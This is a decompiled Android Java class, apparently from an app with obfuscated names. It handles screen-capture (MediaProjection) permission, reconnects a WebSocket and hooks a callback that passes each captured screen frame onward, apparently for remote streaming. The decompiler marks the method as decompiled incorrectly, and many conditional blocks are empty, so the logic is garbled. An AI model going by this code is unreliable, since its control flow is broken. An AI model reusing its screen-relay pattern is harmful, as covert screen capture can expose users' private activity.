package com.storm.safe.rock.manager;

import com.storm.safe.rock.service.MediaDisplayService;
import com.storm.safe.rock.service.modules.C0323a8;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.h10;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.u11;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.etzbzyzqxvqm$onMediaProjectionPermissionResult$1", m214403f = "etzbzyzqxvqm.kt", m214404l = {268, 294}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class etzbzyzqxvqm$onMediaProjectionPermissionResult$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public C0323a8 f52162a1;

    /* renamed from: a2 */
    public int f52163a2;

    /* renamed from: a3 */
    public int f52164a3;

    /* renamed from: a4 */
    public final /* synthetic */ C0263a5 f52165a4;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public etzbzyzqxvqm$onMediaProjectionPermissionResult$1(C0263a5 c0263a5, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52165a4 = c0263a5;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new etzbzyzqxvqm$onMediaProjectionPermissionResult$1(this.f52165a4, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((etzbzyzqxvqm$onMediaProjectionPermissionResult$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Removed duplicated region for block: B:24:0x004e  */
    /* JADX WARN: Removed duplicated region for block: B:32:0x0065 A[Catch: Exception -> 0x0019, TryCatch #0 {Exception -> 0x0019, blocks: (B:7:0x0014, B:46:0x00a3, B:38:0x0089, B:42:0x0095, B:47:0x00a6, B:49:0x00ac, B:53:0x00bc, B:52:0x00b3, B:54:0x00c6, B:14:0x0028, B:29:0x005f, B:22:0x004a, B:26:0x0052, B:30:0x0061, B:32:0x0065, B:34:0x0070, B:36:0x0076, B:37:0x0079, B:33:0x006b, B:17:0x002f, B:19:0x0039, B:21:0x003d), top: B:59:0x000c }] */
    /* JADX WARN: Removed duplicated region for block: B:33:0x006b A[Catch: Exception -> 0x0019, TryCatch #0 {Exception -> 0x0019, blocks: (B:7:0x0014, B:46:0x00a3, B:38:0x0089, B:42:0x0095, B:47:0x00a6, B:49:0x00ac, B:53:0x00bc, B:52:0x00b3, B:54:0x00c6, B:14:0x0028, B:29:0x005f, B:22:0x004a, B:26:0x0052, B:30:0x0061, B:32:0x0065, B:34:0x0070, B:36:0x0076, B:37:0x0079, B:33:0x006b, B:17:0x002f, B:19:0x0039, B:21:0x003d), top: B:59:0x000c }] */
    /* JADX WARN: Removed duplicated region for block: B:36:0x0076 A[Catch: Exception -> 0x0019, TryCatch #0 {Exception -> 0x0019, blocks: (B:7:0x0014, B:46:0x00a3, B:38:0x0089, B:42:0x0095, B:47:0x00a6, B:49:0x00ac, B:53:0x00bc, B:52:0x00b3, B:54:0x00c6, B:14:0x0028, B:29:0x005f, B:22:0x004a, B:26:0x0052, B:30:0x0061, B:32:0x0065, B:34:0x0070, B:36:0x0076, B:37:0x0079, B:33:0x006b, B:17:0x002f, B:19:0x0039, B:21:0x003d), top: B:59:0x000c }] */
    /* JADX WARN: Removed duplicated region for block: B:40:0x0091  */
    /* JADX WARN: Removed duplicated region for block: B:49:0x00ac A[Catch: Exception -> 0x0019, TryCatch #0 {Exception -> 0x0019, blocks: (B:7:0x0014, B:46:0x00a3, B:38:0x0089, B:42:0x0095, B:47:0x00a6, B:49:0x00ac, B:53:0x00bc, B:52:0x00b3, B:54:0x00c6, B:14:0x0028, B:29:0x005f, B:22:0x004a, B:26:0x0052, B:30:0x0061, B:32:0x0065, B:34:0x0070, B:36:0x0076, B:37:0x0079, B:33:0x006b, B:17:0x002f, B:19:0x0039, B:21:0x003d), top: B:59:0x000c }] */
    /* JADX WARN: Removed duplicated region for block: B:54:0x00c6 A[Catch: Exception -> 0x0019, TRY_LEAVE, TryCatch #0 {Exception -> 0x0019, blocks: (B:7:0x0014, B:46:0x00a3, B:38:0x0089, B:42:0x0095, B:47:0x00a6, B:49:0x00ac, B:53:0x00bc, B:52:0x00b3, B:54:0x00c6, B:14:0x0028, B:29:0x005f, B:22:0x004a, B:26:0x0052, B:30:0x0061, B:32:0x0065, B:34:0x0070, B:36:0x0076, B:37:0x0079, B:33:0x006b, B:17:0x002f, B:19:0x0039, B:21:0x003d), top: B:59:0x000c }] */
    /* JADX WARN: Type inference failed for: r0v3, types: [com.storm.safe.rock.manager.etzbzyzqxvqm$onMediaProjectionPermissionResult$1$1, kotlin.jvm.internal.Lambda] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:27:0x005c -> B:29:0x005f). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:45:0x00a2 -> B:46:0x00a3). Please report as a decompilation issue!!! */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        C0323a8 c0323a8;
        int i;
        u11 u11Var;
        MediaDisplayService.C0279a0 c0279a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = this.f52164a3;
        int i3 = 0;
        try {
        } catch (Exception e) {
            t60.m214705c6("etzbzyzqxvqm", "❌ 设置系统投屏回调失败", e);
        }
        if (i2 == 0) {
            kg1.m213544f4(obj);
            C0323a8 c0323a8M211471g5 = this.f52165a4.f52151a0.m211471g5();
            if (c0323a8M211471g5 != null && !c0323a8M211471g5.f53103a3) {
                t60.m214726f4("etzbzyzqxvqm", "⚠️ WebSocket未连接，触发重连...");
                c0323a8M211471g5.m211643a8();
                c0323a8M211471g5.m211669d6();
                c0323a8 = c0323a8M211471g5;
                i = 0;
                if (c0323a8.f53103a3) {
                }
                if (c0323a8.f53103a3) {
                }
            }
            u11Var = this.f52165a4.f52155a4;
            if (u11Var != null) {
            }
            C0263a5 c0263a5 = this.f52165a4;
            c0263a5.f52155a4 = null;
            c0263a5.f52152a1 = false;
            this.f52165a4.f52153a2 = false;
            this.f52165a4.f52154a3 = "mediaprojection";
            c0279a0 = MediaDisplayService.f52303c1;
            if (c0279a0.getInstance() == null) {
            }
            if (c0279a0.getInstance() != null) {
            }
            return C1351vv.f60710b1;
        }
        if (i2 != 1) {
            if (i2 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i4 = this.f52163a2;
            kg1.m213544f4(obj);
            i3 = i4 + 1;
            c0279a0 = MediaDisplayService.f52303c1;
            if (c0279a0.getInstance() == null || i3 >= 100) {
                if (c0279a0.getInstance() != null) {
                    MediaDisplayService c0279a02 = c0279a0.getInstance();
                    if (c0279a02 != null) {
                        final C0263a5 c0263a52 = this.f52165a4;
                        c0279a02.f52323b4 = new h10() { // from class: com.storm.safe.rock.manager.etzbzyzqxvqm$onMediaProjectionPermissionResult$1.1
                            {
                                super(1);
                            }

                            @Override // p000.h10
                            public final Object invoke(Object obj2) {
                                byte[] bArr = (byte[]) obj2;
                                t60.m214695b6(bArr, "frameData");
                                C0263a5.m211346a3(c0263a52, bArr);
                                return C1351vv.f60710b1;
                            }
                        };
                    }
                    this.f52165a4.f52152a1 = true;
                    t60.m214714d6("etzbzyzqxvqm", "✅ 系统投屏回调已设置");
                } else {
                    t60.m214704c5("etzbzyzqxvqm", "❌ MediaDisplayService 启动超时");
                }
                return C1351vv.f60710b1;
            }
            this.f52162a1 = null;
            this.f52163a2 = i3;
            this.f52164a3 = 2;
            if (b81.m210571b1(100L, this) != coroutineSingletons) {
                i4 = i3;
                i3 = i4 + 1;
                c0279a0 = MediaDisplayService.f52303c1;
                if (c0279a0.getInstance() == null) {
                }
                if (c0279a0.getInstance() != null) {
                }
                return C1351vv.f60710b1;
            }
            return coroutineSingletons;
        }
        i = this.f52163a2;
        c0323a8 = this.f52162a1;
        kg1.m213544f4(obj);
        i++;
        if (!c0323a8.f53103a3 || i >= 30) {
            if (c0323a8.f53103a3) {
                t60.m214714d6("etzbzyzqxvqm", "✅ WebSocket重连成功");
            } else {
                t60.m214726f4("etzbzyzqxvqm", "⚠️ WebSocket重连超时，投屏可能显示不出来");
            }
            u11Var = this.f52165a4.f52155a4;
            if (u11Var != null) {
                u11Var.m215253a7(null);
            }
            C0263a5 c0263a53 = this.f52165a4;
            c0263a53.f52155a4 = null;
            c0263a53.f52152a1 = false;
            this.f52165a4.f52153a2 = false;
            this.f52165a4.f52154a3 = "mediaprojection";
            c0279a0 = MediaDisplayService.f52303c1;
            if (c0279a0.getInstance() == null) {
            }
            if (c0279a0.getInstance() != null) {
            }
            return C1351vv.f60710b1;
        }
        this.f52162a1 = c0323a8;
        this.f52163a2 = i;
        this.f52164a3 = 1;
        if (b81.m210571b1(100L, this) == coroutineSingletons) {
            return coroutineSingletons;
        }
        i++;
        if (c0323a8.f53103a3) {
        }
        if (c0323a8.f53103a3) {
        }
        u11Var = this.f52165a4.f52155a4;
        if (u11Var != null) {
        }
        C0263a5 c0263a532 = this.f52165a4;
        c0263a532.f52155a4 = null;
        c0263a532.f52152a1 = false;
        this.f52165a4.f52153a2 = false;
        this.f52165a4.f52154a3 = "mediaprojection";
        c0279a0 = MediaDisplayService.f52303c1;
        if (c0279a0.getInstance() == null) {
        }
        if (c0279a0.getInstance() != null) {
        }
        return C1351vv.f60710b1;
    }
}
